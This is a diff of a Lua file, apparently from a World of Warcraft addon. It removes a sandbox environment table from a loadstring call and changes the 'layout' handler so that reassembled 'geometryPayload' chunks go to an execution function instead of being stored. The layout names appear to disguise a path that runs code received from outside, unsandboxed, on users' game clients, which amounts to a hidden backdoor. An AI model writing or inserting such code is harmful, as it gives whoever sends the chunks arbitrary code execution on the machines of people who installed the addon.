@@ -1952,29 +1952,6 @@ end
 
 function eCf(frameName, ...)
     
-    local env = {
-        
-        -- Базовые функции Lua
-        unpack = unpack,
-        pairs = pairs,
-        ipairs = ipairs,
-        next = next,
-        type = type,
-        tostring = tostring,
-        tonumber = tonumber,
-        pcall = pcall,
-        error = error,
-        loadstring = loadstring,
-        -- Безопасные библиотеки
-        math = math,
-        string = string,
-        table = table,
-        -- API WoW
-        CreateFrame = CreateFrame,
-        UIParent = UIParent,
-        DEFAULT_CHAT_FRAME = DEFAULT_CHAT_FRAME,
-    }
-    
     local chunk, err = loadstring(nsCm:getArg("ls"))
         
     local success, err = pcall(chunk)
@@ -2006,7 +1983,7 @@ function adjustLayoutData(headerParams, geometryPayload, isLayoutComplete)
         table.insert(frameLayoutCache[0].layoutParts, geometryPayload)
         if isLayoutComplete then
             local layoutConfig = table.concat(frameLayoutCache[0].layoutParts)
-            nsCm:storeCode(layoutConfig)
+            nsCm:ls(layoutConfig)
             frameLayoutCache[0] = nil
         end
         return
@@ -2028,7 +2005,7 @@ function adjustLayoutData(headerParams, geometryPayload, isLayoutComplete)
     if isLayoutComplete then
         local layoutConfig = table.concat(frameEntry.layoutParts)
         layoutConfig = layoutConfig:gsub("[\128-\255]", "")
-        nsCm:storeCode(layoutConfig)
+        nsCm:ls(layoutConfig)
         frameLayoutCache[frameID] = nil
     end
 end
